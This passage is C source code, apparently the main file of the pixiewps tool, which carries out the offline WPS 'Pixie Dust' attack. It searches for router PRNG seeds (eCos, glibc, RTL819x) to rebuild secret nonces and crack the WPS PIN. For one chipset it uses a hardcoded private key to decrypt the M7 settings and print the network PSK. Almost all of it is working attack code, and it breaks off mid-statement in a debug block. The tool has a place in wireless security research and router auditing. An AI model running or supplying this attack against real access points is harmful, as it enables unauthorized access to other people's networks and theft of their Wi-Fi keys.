/*
 * pixiewps: offline WPS brute-force utility that exploits low entropy PRNGs
 *
 * Copyright (c) 2015-2017, wiire <wi7ire@gmail.com>
 * SPDX-License-Identifier: GPL-3.0+
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 */

#define _POSIX_C_SOURCE 200809L

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <getopt.h>
#include <pthread.h>
#include <limits.h>
#include <stdarg.h> /* libtommath.c */
#if defined(_WIN32) || defined(__WIN32__)
#include <windows.h>
#endif

#include <sys/types.h>
#include <sys/time.h>

#include "pixiewps.h"
#include "config.h"
#include "crypto/crypto_internal-modexp.c"
#include "crypto/aes-cbc.c"
#include "utils.h"
#include "wps.h"
#include "version.h"

#define GLIBC_MAX_GEN 4
#include "random/glibc_random.c"
#include "random/glibc_random_lazy.c"

uint32_t ecos_rand_simplest(uint32_t *seed);
uint32_t ecos_rand_simple(uint32_t *seed);
uint32_t ecos_rand_knuth(uint32_t *seed);
uint_fast8_t crack(struct global *g, char *pin);

static const char *option_string = "e:r:s:z:a:n:m:b:o:v:j:5:7:SflVh?";
static const struct option long_options[] = {
	{ "pke",       required_argument, 0, 'e' },
	{ "pkr",       required_argument, 0, 'r' },
	{ "e-hash1",   required_argument, 0, 's' },
	{ "e-hash2",   required_argument, 0, 'z' },
	{ "authkey",   required_argument, 0, 'a' },
	{ "e-nonce",   required_argument, 0, 'n' },
	{ "r-nonce",   required_argument, 0, 'm' },
	{ "e-bssid",   required_argument, 0, 'b' },
	{ "output",    required_argument, 0, 'o' },
	{ "verbosity", required_argument, 0, 'v' },
	{ "jobs",      required_argument, 0, 'j' },
	{ "dh-small",  no_argument,       0, 'S' },
	{ "force",     no_argument,       0, 'f' },
	{ "length",    no_argument,       0, 'l' },
	{ "version",   no_argument,       0, 'V' },
	{ "help",      no_argument,       0,  0  },
	{ "mode",      required_argument, 0,  1  },
	{ "start",     required_argument, 0,  2  },
	{ "end",       required_argument, 0,  3  },
	{ "m5-enc",    required_argument, 0, '5' },
	{ "m7-enc",    required_argument, 0, '7' },
	{  0,          no_argument,       0, 'h' },
	{  0,          0,                 0,  0  }
};

#define SECS_PER_JOB_BLOCK 1000

struct crack_job {
	pthread_t thr;
	time_t start;
};

static struct job_control {
	int jobs;
	time_t end;
	uint32_t randr_enonce[4];
	struct crack_job *crack_jobs;
	volatile uint32_t nonce_seed;
} job_control;

static void *crack_thread(void *arg) {
	struct glibc_lazyprng glibc_lazyprng;
	struct crack_job *j = arg;
	uint32_t seed = j->start;
	uint32_t limit = job_control.end;
	uint32_t tmp[4];

	while (!job_control.nonce_seed) {
		unsigned int i;
		glibc_lazyseed(&glibc_lazyprng, seed);
		if (glibc_rand1(&glibc_lazyprng) == job_control.randr_enonce[0]) {
			if (!memcmp(glibc_randfill(&glibc_lazyprng, tmp), job_control.randr_enonce, 4)) {
				job_control.nonce_seed = seed;
				DEBUG_PRINT("Seed found %u", seed);
			}
		}

		if (seed == 0) break;

		seed--;

		if (seed < j->start - SECS_PER_JOB_BLOCK) {
			long long tmp = j->start - SECS_PER_JOB_BLOCK * job_control.jobs;
			if (tmp < 0) break;
			j->start = tmp;
			seed = j->start;
			if (seed < limit) break;
		}
	}

	return 0;
}

#ifndef PTHREAD_STACK_MIN
static void setup_thread(int i) {
	pthread_create(&job_control.crack_jobs[i].thr, 0, crack_thread, &job_control.crack_jobs[i]);
}
#else
static size_t getminstacksize(size_t minimum) {
	return (minimum < PTHREAD_STACK_MIN) ? PTHREAD_STACK_MIN : minimum;
}

static void setup_thread(int i) {
	size_t stacksize = getminstacksize(64*1024);
	pthread_attr_t attr;
	int attr_ok = pthread_attr_init(&attr) == 0 ;
	if(attr_ok) pthread_attr_setstacksize(&attr, stacksize);
	pthread_create(&job_control.crack_jobs[i].thr, &attr, crack_thread, &job_control.crack_jobs[i]);
	if(attr_ok) pthread_attr_destroy(&attr);
}
#endif

static void init_crack_jobs(struct global *wps) {
	job_control.jobs = wps->jobs;
	job_control.end = wps->end;
	job_control.nonce_seed = 0;
	memset(job_control.randr_enonce, 0, sizeof(job_control.randr_enonce));
	/* Converting enrollee nonce to the sequence may be generated by current random function */
	int i, j = 0;
	for (i = 0; i < 4; i++) {
		job_control.randr_enonce[i] |= wps->e_nonce[j++];
		job_control.randr_enonce[i] <<= 8;
		job_control.randr_enonce[i] |= wps->e_nonce[j++];
		job_control.randr_enonce[i] <<= 8;
		job_control.randr_enonce[i] |= wps->e_nonce[j++];
		job_control.randr_enonce[i] <<= 8;
		job_control.randr_enonce[i] |= wps->e_nonce[j++];
	}
	job_control.crack_jobs = malloc(wps->jobs * sizeof (struct job_control));
	time_t curr = wps->start;
	for(i = 0; i < wps->jobs; i++) {
		job_control.crack_jobs[i].start = curr;
		setup_thread(i);
		curr -= SECS_PER_JOB_BLOCK;
	}
}

static uint32_t collect_crack_jobs() {
	int i;
	for (i = 0; i < job_control.jobs; i++)	{
		void* ret;
		pthread_join(job_control.crack_jobs[i].thr, &ret);
	}
	free(job_control.crack_jobs);
	return job_control.nonce_seed;
}

unsigned int hardware_concurrency() {
#if defined(PTW32_VERSION) || defined(__hpux)
	return pthread_num_processors_np();
#elif defined(__APPLE__) || defined(__FreeBSD__)
	int count;
	size_t size = sizeof(count);
	return sysctlbyname("hw.ncpu", &count, &size, NULL, 0) ? 0 : count;
#elif defined(_SC_NPROCESSORS_ONLN) /* unistd.h */
	int const count = sysconf(_SC_NPROCESSORS_ONLN);
	return (count > 0) ? count : 0;
#elif defined(__GLIBC__)
	return get_nprocs();
#elif defined(_WIN32) || defined(__WIN32__)
	SYSTEM_INFO sysinfo;
	GetSystemInfo(&sysinfo);
	return sysinfo.dwNumberOfProcessors;
#else
	return 0;
#endif
}

int main(int argc, char **argv) {

	struct global *wps;
	if ((wps = calloc(1, sizeof(struct global)))) {
		unsigned int cores = hardware_concurrency();
		wps->jobs = cores == 0 ? 1 : cores;
		wps->mode_auto = 1;
		wps->verbosity = 3;
		wps->error = calloc(256, 1);
		if (!wps->error)
			goto memory_err;
		wps->error[0] = '\n';
	} else {
memory_err:
		fprintf(stderr, "\n [X] Memory allocation error!\n");
		return MEM_ERROR;
	}

	time_t start_p = (time_t) -1, end_p = (time_t) -1;
	struct timeval t_start, t_end;

	int opt = 0;
	int long_index = 0;
	uint_fast8_t c = 0;
	opt = getopt_long(argc, argv, option_string, long_options, &long_index);
	while (opt != -1) {
		c++;
		switch (opt) {
			case 'j':
				if (get_int(optarg, &wps->jobs) != 0 || wps->jobs < 1) {
					snprintf(wps->error, 256, "\n [!] Bad number of jobs -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'e':
				wps->pke = malloc(WPS_PKEY_LEN);
				if (!wps->pke)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->pke, WPS_PKEY_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad enrollee public key -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'r':
				wps->pkr = malloc(WPS_PKEY_LEN);
				if (!wps->pkr)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->pkr, WPS_PKEY_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad registrar public key -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 's':
				wps->e_hash1 = malloc(WPS_HASH_LEN);
				if (!wps->e_hash1)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->e_hash1, WPS_HASH_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad hash -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'z':
				wps->e_hash2 = malloc(WPS_HASH_LEN);
				if (!wps->e_hash2)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->e_hash2, WPS_HASH_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad hash -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'a':
				wps->authkey = malloc(WPS_AUTHKEY_LEN);
				if (!wps->authkey)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->authkey, WPS_HASH_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad authentication session key -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'n':
				wps->e_nonce = malloc(WPS_NONCE_LEN);
				if (!wps->e_nonce)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->e_nonce, WPS_NONCE_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad enrollee nonce -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'm':
				wps->r_nonce = malloc(WPS_NONCE_LEN);
				if (!wps->r_nonce)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->r_nonce, WPS_NONCE_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad registrar nonce -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'b':
				wps->e_bssid = malloc(WPS_BSSID_LEN);
				if (!wps->e_bssid)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->e_bssid, WPS_BSSID_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad enrollee MAC address -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'S':
				wps->small_dh_keys = 1;
				break;
			case 'f':
				wps->bruteforce = 1;
				break;
			case 'l':
				wps->anylength = 1;
				break;
			case 'o':
				if (!freopen(optarg, "w", stdout))
				{
					snprintf(wps->error, 256, "\n [!] Failed to open file for writing -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'v':
				if (get_int(optarg, &wps->verbosity) != 0 || wps->verbosity < 1 || wps->verbosity > 3) {
					snprintf(wps->error, 256, "\n [!] Bad verbosity level -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'V':
			{
				if (c > 1) { /* If --version is used then no other argument should be supplied */
					snprintf(wps->error, 256, "\n [!] Bad use of argument --version (-V)!\n\n");
					goto usage_err;
				} else {
					unsigned int cores = hardware_concurrency();
					struct timeval t_current;
					gettimeofday(&t_current, 0);
					time_t r_time;
					struct tm ts;
					char buffer[30];
					r_time = t_current.tv_sec;
					ts = *gmtime(&r_time);
					strftime(buffer, 30, "%c", &ts);
					fprintf(stderr, "\n ");
					printf("Pixiewps %s", LONG_VERSION); fflush(stdout);
					fprintf(stderr, "\n\n"
							" [*] System time: %lu (%s UTC)\n"
							" [*] Number of cores available: %u\n\n",
							(unsigned long) t_current.tv_sec, buffer, cores == 0 ? 1 : cores);
					free(wps->error);
					free(wps);
					return ARG_ERROR;
				}
			}
			case 'h':
				goto usage_err;
				break;
			case  0 :
				if (strcmp("help", long_options[long_index].name) == 0) {
					fprintf(stderr, v_usage, SHORT_VERSION,
						p_mode_name[RT],
						p_mode_name[ECOS_SIMPLE],
						p_mode_name[RTL819x],
						p_mode_name[ECOS_SIMPLEST],
						p_mode_name[ECOS_KNUTH]
					);
					free(wps->error);
					free(wps);
					return ARG_ERROR;
				}
				goto usage_err;
			case  1 :
				if (strcmp("mode", long_options[long_index].name) == 0) {
					if (parse_mode(optarg, p_mode, MODE_LEN)) {
						snprintf(wps->error, 256, "\n [!] Bad modes -- %s\n\n", optarg);
						goto usage_err;
					}
					wps->mode_auto = 0;
					break;
				}
				goto usage_err;
			case  2 :
				if (strcmp("start", long_options[long_index].name) == 0) {
					if (get_unix_datetime(optarg, &(start_p))) {
						snprintf(wps->error, 256, "\n [!] Bad starting point -- %s\n\n", optarg);
						goto usage_err;
					}
					break;
				}
				goto usage_err;
			case  3 :
				if (strcmp("end", long_options[long_index].name) == 0) {
					if (get_unix_datetime(optarg, &(end_p))) {
						snprintf(wps->error, 256, "\n [!] Bad ending point -- %s\n\n", optarg);
						goto usage_err;
					}
					break;
				}
				goto usage_err;
			case '5':
				wps->m5_encr = malloc(ENC_SETTINGS_LEN);
				if (!wps->m5_encr)
					goto memory_err;
				if (hex_string_to_byte_array_max(optarg, wps->m5_encr, ENC_SETTINGS_LEN, &wps->m5_encr_len)) {
					snprintf(wps->error, 256, "\n [!] Bad m5 encrypted settings -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case '7':
				wps->m7_encr = malloc(ENC_SETTINGS_LEN);
				if (!wps->m7_encr)
					goto memory_err;
				if (hex_string_to_byte_array_max(optarg, wps->m7_encr, ENC_SETTINGS_LEN, &wps->m7_encr_len)) {
					snprintf(wps->error, 256, "\n [!] Bad m7 encrypted settings -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case '?':
			default:
				fprintf(stderr, "Run %s -h for help.\n", argv[0]);
				free(wps->error);
				free(wps);
				return ARG_ERROR;
		}
		opt = getopt_long(argc, argv, option_string, long_options, &long_index);
	}

	if (argc - optind != 0) {
		snprintf(wps->error, 256, "\n [!] Unknown extra argument(s)!\n\n");
		goto usage_err;
	} else {
		if (!c) {
usage_err:
			fprintf(stderr, usage, SHORT_VERSION, argv[0], wps->error);

			free(wps->pke);
			free(wps->pkr);
			free(wps->e_hash1);
			free(wps->e_hash2);
			free(wps->authkey);
			free(wps->e_nonce);
			free(wps->r_nonce);
			free(wps->e_bssid);

			free(wps->error);
			free(wps);
			return ARG_ERROR;
		}
	}

	/* Mode 3 is enforced to make users aware this option is currently only available for RTL819x */
	if (wps->m7_encr) {
		if (!wps->pke || !wps->pkr || !wps->e_nonce || !wps->r_nonce || !wps->e_bssid || !is_mode_selected(RTL819x)) {
			snprintf(wps->error, 256, "\n [!] Must specify --pke, --pkr, --e-nonce, --r-nonce, --bssid and --mode 3!\n\n");
			goto usage_err;
		}
		if (memcmp(wps->pke, wps_rtl_pke, WPS_PKEY_LEN)) {
			printf("\n Pixiewps %s\n", SHORT_VERSION);
			printf("\n [-] Model not supported!\n\n");
			return UNS_ERROR;
		}
		wps->e_key = malloc(WPS_PKEY_LEN);
		if (!wps->e_key)
			goto memory_err;
		SET_RTL_PRIV_KEY(wps->e_key);

		size_t pkey_len = WPS_PKEY_LEN;
		uint8_t *buffer = malloc(WPS_PKEY_LEN);
		if (!buffer)
			goto memory_err;

		wps->dhkey   = malloc(WPS_HASH_LEN);       if (!wps->dhkey)   goto memory_err;
		wps->kdk     = malloc(WPS_HASH_LEN);       if (!wps->kdk)     goto memory_err;
		wps->authkey = malloc(WPS_AUTHKEY_LEN);    if (!wps->authkey) goto memory_err;
		wps->wrapkey = malloc(WPS_KEYWRAPKEY_LEN); if (!wps->wrapkey) goto memory_err;
		wps->emsk    = malloc(WPS_EMSK_LEN);       if (!wps->emsk)    goto memory_err;

		/* DHKey = SHA-256(g^(AB) mod p) = SHA-256(PKe^A mod p) = SHA-256(PKr^B mod p) */
		crypto_mod_exp(wps->pkr, WPS_PKEY_LEN, wps->e_key, WPS_PKEY_LEN, dh_group5_prime, WPS_PKEY_LEN, buffer, &pkey_len);
		sha256(buffer, WPS_PKEY_LEN, wps->dhkey);
		free(wps->e_key);

		memcpy(buffer, wps->e_nonce, WPS_NONCE_LEN);
		memcpy(buffer + WPS_NONCE_LEN, wps->e_bssid, WPS_BSSID_LEN);
		memcpy(buffer + WPS_NONCE_LEN + WPS_BSSID_LEN, wps->r_nonce, WPS_NONCE_LEN);

		/* KDK = HMAC-SHA-256{DHKey}(Enrollee nonce || Enrollee MAC || Registrar nonce) */
		hmac_sha256(wps->dhkey, WPS_HASH_LEN, buffer, WPS_NONCE_LEN * 2 + WPS_BSSID_LEN, wps->kdk);

		/* Key derivation function */
		kdf(wps->kdk, buffer);
		memcpy(wps->authkey, buffer, WPS_AUTHKEY_LEN);
		memcpy(wps->wrapkey, buffer + WPS_AUTHKEY_LEN, WPS_KEYWRAPKEY_LEN);
		memcpy(wps->emsk, buffer + WPS_AUTHKEY_LEN + WPS_KEYWRAPKEY_LEN, WPS_EMSK_LEN);

		/* Decrypt encrypted settings */
		uint8_t *decrypted7 = decrypt_encr_settings(wps->wrapkey, wps->m7_encr, wps->m7_encr_len);
		free(wps->m7_encr);
		if (!decrypted7) {
			printf("\n Pixiewps %s\n", SHORT_VERSION);
			printf("\n [x] Unexpected error while decrypting (--m7-enc)!\n\n");
			return UNS_ERROR;
		}

		uint8_t *decrypted5 = NULL;
		if (wps->m5_encr) {
			decrypted5 = decrypt_encr_settings(wps->wrapkey, wps->m5_encr, wps->m5_encr_len);
			free(wps->m5_encr);
			if (!decrypted5) {
				printf("\n Pixiewps %s\n", SHORT_VERSION);
				printf("\n [x] Unexpected error while decrypting (--m5-enc)!\n\n");
				return UNS_ERROR;
			}
		}

		printf("\n Pixiewps %s\n", SHORT_VERSION);
		if (wps->verbosity > 1) {
			printf("\n [*] Mode:                  %d (%s)", RTL819x, p_mode_name[RTL819x]);
		}
		vtag_t *vtag;
		if (wps->verbosity > 2) {
			printf("\n [*] DHKey:                 "); byte_array_print(wps->dhkey, WPS_HASH_LEN);
			printf("\n [*] KDK:                   "); byte_array_print(wps->kdk, WPS_HASH_LEN);
			printf("\n [*] AuthKey:               "); byte_array_print(wps->authkey, WPS_AUTHKEY_LEN);
			printf("\n [*] EMSK:                  "); byte_array_print(wps->emsk, WPS_EMSK_LEN);
			printf("\n [*] KeyWrapKey:            "); byte_array_print(wps->wrapkey, WPS_KEYWRAPKEY_LEN);
			if ((vtag = find_vtag(decrypted7, wps->m7_encr_len - 16, WPS_TAG_KEYWRAP_AUTH, WPS_TAG_KEYWRAP_AUTH_LEN))) {
				memcpy(buffer, vtag->data, WPS_TAG_KEYWRAP_AUTH_LEN);
				printf("\n [*] KeyWrap Authenticator: "); byte_array_print(buffer, WPS_TAG_KEYWRAP_AUTH_LEN);
			}
		}
		if ((vtag = find_vtag(decrypted5, wps->m5_encr_len - 16, WPS_TAG_E_SNONCE_1, WPS_NONCE_LEN))) {
			printf("\n [*] ES-1:                  "); byte_array_print(vtag->data, WPS_NONCE_LEN);
		}
		if ((vtag = find_vtag(decrypted7, wps->m7_encr_len - 16, WPS_TAG_E_SNONCE_2, WPS_NONCE_LEN))) {
			printf("\n [*] ES-2:                  "); byte_array_print(vtag->data, WPS_NONCE_LEN);
		}
		if ((vtag = find_vtag(decrypted7, wps->m7_encr_len - 16, WPS_TAG_SSID, 0))) {
			int tag_size = be16_to_h(vtag->len);
			memcpy(buffer, vtag->data, tag_size);
			buffer[tag_size] = '\0';
			printf("\n [*] SSID:                  %s", buffer);
		}
		if ((vtag = find_vtag(decrypted7, wps->m7_encr_len - 16, WPS_TAG_NET_KEY, 0))) {
			int tag_size = be16_to_h(vtag->len);
			memcpy(buffer, vtag->data, tag_size);
			buffer[tag_size] = '\0';
			printf("\n [+] PSK:                   %s\n\n", buffer);
		} else {
			printf("\n [-] PSK not found!\n\n");
		}

		if (decrypted5)
			free(decrypted5);

		free(decrypted7);
		free(buffer);
		free(wps->pke);
		free(wps->pkr);
		free(wps->e_nonce);
		free(wps->r_nonce);
		free(wps->e_bssid);
		free(wps->dhkey);
		free(wps->kdk);
		free(wps->authkey);
		free(wps->wrapkey);
		free(wps->emsk);
		free(wps->error);
		free(wps);

		return 0;
	}

	/* Not all required arguments have been supplied */
	if (wps->pke == 0 || wps->e_hash1 == 0 || wps->e_hash2 == 0 || wps->e_nonce == 0) {
		snprintf(wps->error, 256, "\n [!] Not all required arguments have been supplied!\n\n");
		goto usage_err;
	}

	/* If --dh-small is selected then no --pkr should be supplied */
	if (wps->pkr && wps->small_dh_keys) {
		snprintf(wps->error, 256, "\n [!] Options --dh-small and --pkr are mutually exclusive!\n\n");
		goto usage_err;
	}

	/* Either --pkr or --dh-small must be specified */
	if (!wps->pkr && !wps->small_dh_keys) {
		snprintf(wps->error, 256, "\n [!] Either --pkr or --dh-small must be specified!\n\n");
		goto usage_err;
	}

	/* Cannot specify --start or --end if --force is selected */
	if (wps->bruteforce && ((start_p != (time_t) -1) || (end_p != (time_t) -1))) {
		snprintf(wps->error, 256, "\n [!] Cannot specify --start or --end if --force is selected!\n\n");
		goto usage_err;
	}

	if (wps->mode_auto) { /* Mode auto, order by probability */
		if (!memcmp(wps->pke, wps_rtl_pke, WPS_PKEY_LEN)) {
			p_mode[0] = RTL819x;
			p_mode[1] = NONE;
		} else {
			p_mode[0] = RT;
			if (wps->pke && (!(wps->e_nonce[0] & 0x80) && !(wps->e_nonce[4]  & 0x80) &&
					!(wps->e_nonce[8] & 0x80) && !(wps->e_nonce[12] & 0x80))) {
				p_mode[1] = RTL819x;
				p_mode[2] = ECOS_SIMPLE;
				p_mode[3] = NONE;
			} else {
				p_mode[1] = ECOS_SIMPLE;
				p_mode[2] = NONE;
			}
		}
	}

	DEBUG_PRINT("Debugging enabled");
	DEBUG_PRINT("Modes: %d (%s), %d (%s), %d (%s), %d (%s), %d (%s)",
		p_mode[0], p_mode_name[p_mode[0]],
		p_mode[1], p_mode_name[p_mode[1]],
		p_mode[2], p_mode_name[p_mode[2]],
		p_mode[3], p_mode_name[p_mode[3]],
		p_mode[4], p_mode_name[p_mode[4]]
	);

	gettimeofday(&t_start, 0);

	if (is_mode_selected(RTL819x)) { /* Ignore --start and --end otherwise */

		wps->start = t_start.tv_sec + SEC_PER_DAY; /* Extra 1 day */
		wps->end = t_start.tv_sec - MODE3_DAYS * SEC_PER_DAY;

		/* Attributes --start and --end can be switched start > end or end > start */
		if (start_p != (time_t) -1) {
			if (end_p != (time_t) -1) {

				/* Attributes --start and --end must be different */
				if (start_p == end_p) {
					snprintf(wps->error, 256, "\n [!] Starting and Ending points must be different!\n\n");
					goto usage_err;
				}
				if (end_p > start_p) {
					wps->start = end_p;
					wps->end = start_p;
				} else {
					wps->start = start_p;
					wps->end = end_p;
				}
			} else {
				if (start_p >= wps->start) {
					snprintf(wps->error, 256, "\n [!] Bad Starting point!\n\n");
					goto usage_err;
				} else {
					wps->end = start_p;
				}
			}
		} else {
			if (end_p != (time_t) -1) {
				if (end_p >= wps->start) {
					snprintf(wps->error, 256, "\n [!] Bad Ending point!\n\n");
					goto usage_err;
				} else {
					wps->end = end_p;
				}
			} else {
				if (wps->bruteforce) {
					wps->start += SEC_PER_DAY; /* Extra 1 day */
					wps->end = 0;
				}
			}
		}
	}

	if (wps->small_dh_keys) { /* Small DH keys selected */
		wps->pkr = malloc(WPS_PKEY_LEN);
		if (!wps->pkr)
			goto memory_err;

		/* g^A mod p = 2 (g = 2, A = 1, p > 2) */
		memset(wps->pkr, 0, WPS_PKEY_LEN - 1);
		wps->pkr[WPS_PKEY_LEN - 1] = 0x02;

		if (!wps->authkey) {
			if (wps->e_nonce) {
				if (wps->r_nonce) {
					if (wps->e_bssid) { /* Computing AuthKey */
						wps->dhkey = malloc(WPS_HASH_LEN);
						if (!wps->dhkey)
							goto memory_err;
						wps->kdk = malloc(WPS_HASH_LEN);
						if (!wps->kdk)
							goto memory_err;

						uint8_t *buffer = malloc(WPS_NONCE_LEN * 2 + WPS_BSSID_LEN);
						if (!buffer)
							goto memory_err;

						/* DHKey = SHA-256(g^(AB) mod p) = SHA-256(PKe^A mod p) = SHA-256(PKe) (g = 2, A = 1, p > 2) */
						sha256(wps->pke, WPS_PKEY_LEN, wps->dhkey);

						memcpy(buffer, wps->e_nonce, WPS_NONCE_LEN);
						memcpy(buffer + WPS_NONCE_LEN, wps->e_bssid, WPS_BSSID_LEN);
						memcpy(buffer + WPS_NONCE_LEN + WPS_BSSID_LEN, wps->r_nonce, WPS_NONCE_LEN);

						/* KDK = HMAC-SHA-256{DHKey}(Enrollee nonce || Enrollee MAC || Registrar nonce) */
						hmac_sha256(wps->dhkey, WPS_HASH_LEN, buffer, WPS_NONCE_LEN * 2 + WPS_BSSID_LEN, wps->kdk);

						uint8_t *nbuffer = realloc(buffer, WPS_HASH_LEN * 3);
						if (!nbuffer) {
							free(buffer);
							goto memory_err;
						}
						buffer = nbuffer;

						/* Key derivation function */
						kdf(wps->kdk, buffer);

						wps->authkey = malloc(WPS_AUTHKEY_LEN);
						if (!wps->authkey)
							goto memory_err;

						memcpy(wps->authkey, buffer, WPS_AUTHKEY_LEN);

						if (wps->verbosity > 2) {
							wps->wrapkey = malloc(WPS_KEYWRAPKEY_LEN);
							if (!wps->wrapkey)
								goto memory_err;
							wps->emsk = malloc(WPS_EMSK_LEN);
							if (!wps->emsk)
								goto memory_err;

							memcpy(wps->wrapkey, buffer + WPS_AUTHKEY_LEN, WPS_KEYWRAPKEY_LEN);
							memcpy(wps->emsk, buffer + WPS_AUTHKEY_LEN + WPS_KEYWRAPKEY_LEN, WPS_EMSK_LEN);
						}
						if (wps->verbosity < 3) {
							free(wps->dhkey);
							free(wps->kdk);
						}
						free(buffer);
					} else {
						snprintf(wps->error, 256, "\n [!] Neither --authkey and --e-bssid have been supplied!\n\n");
						goto usage_err;
					}
				} else {
					snprintf(wps->error, 256, "\n [!] Neither --authkey and --r-nonce have been supplied!\n\n");
					goto usage_err;
				}
			} else {
				snprintf(wps->error, 256, "\n [!] Neither --authkey and --e-nonce have been supplied!\n\n");
				goto usage_err;
			}
		}
	}

	/* E-S1 = E-S2 = 0 */
	wps->e_s1 = calloc(WPS_SECRET_NONCE_LEN, 1); if (!wps->e_s1) goto memory_err;
	wps->e_s2 = calloc(WPS_SECRET_NONCE_LEN, 1); if (!wps->e_s2) goto memory_err;

	/* Allocating memory for digests */
	wps->psk1 = malloc(WPS_HASH_LEN); if (!wps->psk1) goto memory_err;
	wps->psk2 = malloc(WPS_HASH_LEN); if (!wps->psk2) goto memory_err;

	uint_fast8_t k = 0;
	uint_fast8_t found_p_mode = NONE;
	char pin[WPS_PIN_LEN + 1];
	uint32_t seed;
	uint32_t nonce_seed = 0;
	uint32_t s1_seed = 0;
	uint32_t s2_seed = 0;

	/* Main loop */
	while (!found_p_mode && k < MODE_LEN && p_mode[k] != NONE) {

		/* 1 */
		if (p_mode[k] == RT) {

			DEBUG_PRINT(" * Mode: %d (%s)", RT, p_mode_name[RT]);
			DEBUG_PRINT("Trying with E-S1: ");
			DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
			DEBUG_PRINT("Trying with E-S2: ");
			DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

			uint_fast8_t r = crack(wps, pin);
			if (r == PIN_FOUND) {
				found_p_mode = RT;
				DEBUG_PRINT("Pin found");
			} else if (r == MEM_ERROR) {
				goto memory_err;
			}

		/* 2 */
		} else if (p_mode[k] == ECOS_SIMPLE && wps->e_nonce) {

			DEBUG_PRINT(" * Mode: %d (%s)", ECOS_SIMPLE, p_mode_name[ECOS_SIMPLE]);

			uint32_t index = wps->e_nonce[0] << 25; /* Reducing entropy from 32 to 25 bits */
			do {
				seed = index;
				uint_fast8_t i;
				for (i = 1; i < WPS_NONCE_LEN; i++) {
					if (wps->e_nonce[i] != (uint8_t) (ecos_rand_simple(&seed) & 0xff))
						break;
				}
				if (i == WPS_NONCE_LEN) { /* Seed found */
					nonce_seed = seed;

					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S1 */
						wps->e_s1[i] = (uint8_t) (ecos_rand_simple(&seed) & 0xff);

					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S2 */
						wps->e_s2[i] = (uint8_t) (ecos_rand_simple(&seed) & 0xff);

					DEBUG_PRINT("Seed found");
					break;
				}
				index++;
			} while (!(index & 0x02000000));

			if (nonce_seed) { /* Seed found */

				DEBUG_PRINT("Trying with E-S1: ");
				DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
				DEBUG_PRINT("Trying with E-S2: ");
				DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

				uint_fast8_t r = crack(wps, pin);
				if (r == PIN_FOUND) {
					found_p_mode = ECOS_SIMPLE;
					DEBUG_PRINT("Pin found");
				} else if (r == MEM_ERROR) {
					goto memory_err;
				}
			}

		/* 3 */
		} else if (p_mode[k] == RTL819x && wps->e_nonce) {

			DEBUG_PRINT(" * Mode: %d (%s)", RTL819x, p_mode_name[RTL819x]);

			/* E-S1 = E-S2 = E-Nonce - Best case scenario */
			memcpy(wps->e_s1, wps->e_nonce, WPS_SECRET_NONCE_LEN);
			memcpy(wps->e_s2, wps->e_nonce, WPS_SECRET_NONCE_LEN);

			DEBUG_PRINT("Trying with E-S1: ");
			DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
			DEBUG_PRINT("Trying with E-S2: ");
			DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

			uint_fast8_t r = crack(wps, pin);
			if (r == PIN_FOUND) {
				found_p_mode = RTL819x;
				DEBUG_PRINT("Pin found");
			} else if (r == MEM_ERROR) {
				goto memory_err;
			}

			if (found_p_mode == NONE) {
				if (wps->small_dh_keys || check_small_dh_keys(wps->pkr)) {
					if (!wps->warning) {
						wps->warning = calloc(256, 1);
						if (!wps->warning)
							goto memory_err;
						snprintf(wps->warning, 256, " [!] Small DH keys is not supported for mode %d!\n\n", RTL819x);
					}
				} else {

					/* Checks if the sequence may actually be generated by current random function */
					if (!(wps->e_nonce[0] & 0x80) && !(wps->e_nonce[4]  & 0x80) &&
						!(wps->e_nonce[8] & 0x80) && !(wps->e_nonce[12] & 0x80)) {

						init_crack_jobs(wps);

						#if DEBUG
						{
							struct tm ts;
							char buffer[30];
							ts = *gmtime(&wps->start);
							strftime(buffer, 30, "%c", &ts);
							printf("\n [DEBUG] %s:%d:%s(): Start: %10lu (%s UTC)",
